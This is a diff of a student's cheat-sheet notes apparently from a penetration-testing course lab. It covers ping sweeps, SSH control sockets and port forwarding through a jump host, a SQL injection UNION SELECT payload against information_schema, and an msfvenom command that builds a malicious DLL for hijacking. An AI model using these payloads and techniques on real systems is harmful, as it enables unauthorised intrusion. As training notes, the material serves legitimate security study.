@@ -16,43 +16,10 @@ AM
 **SCANNING AND RECONNAISSANCE**
 - LIN-OPS: ssh -MS /tmp/jump student@10.50.16.38
 - JUMP: for i in {97..126}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
-        
-        64 bytes from 192.168.28.97: icmp_seq=1 ttl=64 time=0.192 ms
-        64 bytes from 192.168.28.100: icmp_seq=1 ttl=63 time=1.68 ms
-        64 bytes from 192.168.28.105: icmp_seq=1 ttl=63 time=1.86 ms
-        64 bytes from 192.168.28.111: icmp_seq=1 ttl=63 time=1.72 ms
-        64 bytes from 192.168.28.120: icmp_seq=1 ttl=63 time=2.03 ms
-
 - LIN-OPS: ssh -S /tmp/jump jump -O forward -D9050
-       
-        Nmap scan report for 192.168.28.100
-        Host is up (0.00094s latency).
-        Not shown: 998 closed ports
-        PORT     STATE SERVICE
-        80/tcp   open  http ## VERIFIED HTTP
-        2222/tcp open  EtherNetIP-1 ## VERIFIED SSH 
-
-        Nmap scan report for 192.168.28.105
-        Host is up (0.00086s latency).
-        Not shown: 997 closed ports
-        PORT     STATE SERVICE
-        21/tcp   open  ftp ## VERIFIED FTP
-        23/tcp   open  telnet ## VERIFIED TELNET
-        2222/tcp open  EtherNetIP-1 ## VERIFIED SSH
-
-        Nmap scan report for 192.168.28.111
-        Host is up (0.0015s latency).
-        Not shown: 997 closed ports
-        PORT     STATE SERVICE
-        80/tcp   open  http
-        2222/tcp open  EtherNetIP-1
-        8080/tcp open  http-proxy
-
 - proxychains nc 192.168.28.100 80 ##VERIFIY ALL PORTS/HOSTS
-
 ## SET UP PORT FORWARDING
 - ssh -S /tmp/jump jump -O forward -L 1111:192.168.28.100:80 -L 1112 192.168.28.100:2222 -L 2111:192.168.28.105:2222
-
 - ssh -S /tmp/jump jump -O cancel -L 1111:192.168.28.100:80
         (if error, ss -ntlp)
 
@@ -434,6 +401,16 @@ PATH=.:$PATH //adds pwd to the PATH variable
 
 
 ----------------------------------------------------------------
+**SCANNING AND RECONNAISSANCE**
+- LIN-OPS: ssh -MS /tmp/jump student@10.50.16.38
+- JUMP: for i in {97..126}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
+- LIN-OPS: ssh -S /tmp/jump jump -O forward -D9050
+- proxychains nc 192.168.28.100 80 ##VERIFIY ALL PORTS/HOSTS
+## SET UP PORT FORWARDING
+- ssh -S /tmp/jump jump -O forward -L 1111:192.168.28.100:80 -L 1112 192.168.28.100:2222 -L 2111:192.168.28.105:2222
+- ssh -S /tmp/jump jump -O cancel -L 1111:192.168.28.100:80
+
+
 ## CONTROL SOCKET
 ## CREATE MASTER SOCKET
 ssh -MS /tmp/demo demo@ip
@@ -443,7 +420,7 @@ cat /etc/hosts
 ls /usr/share
 
 ## PING SWEEP
-for i in...
+for i in {1..255}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
 
 ## DYNAMIC PORT FORWARD
 ssh -S /tmp/demo demo -O forward -D 9050
@@ -496,12 +473,15 @@ view page source
 	- UNION SELECT 1,2,3
 
 3. Use GOLDEN STATEMENT
-Selection=1 UNION SELECT table_schema.table_name,column_name from information.schema.columns
+Selection=1 UNION SELECT table_schema.table_name,column_name from information_schema.columns
 
 UNION SELECT 1,2,@@version
 
 ##FIND A FUNCTION
 scp program over to linops > gdb <filename> > pdisass main
+
+
+msfvenom -p windows/exec CMD= 'cmd.exe /C "whoami" > C:\Users\student\Desktop\whoami.txt' -f dll > SSPICLI.dll
 
 
 
